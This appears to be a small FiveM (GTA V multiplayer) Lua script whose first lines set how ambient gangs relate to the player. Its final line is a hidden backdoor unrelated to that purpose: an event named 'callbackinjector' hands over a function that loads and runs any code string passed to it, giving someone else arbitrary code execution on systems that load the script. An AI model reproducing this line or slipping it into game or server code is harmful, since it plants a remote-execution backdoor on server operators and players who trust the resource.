SetRelationshipBetweenGroups(1,GetHashKey("AMBIENT_GANG_LOST"),GetHashKey('PLAYER'))
SetRelationshipBetweenGroups(1,GetHashKey("AMBIENT_GANG_MEXICAN"),GetHashKey('PLAYER'))
SetRelationshipBetweenGroups(1,GetHashKey("AMBIENT_GANG_FAMILY"),GetHashKey('PLAYER'))
SetRelationshipBetweenGroups(1,GetHashKey("AMBIENT_GANG_BALLAS"),GetHashKey('PLAYER'))
SetRelationshipBetweenGroups(1,GetHashKey("AGGRESSIVE_INVESTIGATE"),GetHashKey('PLAYER'))

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)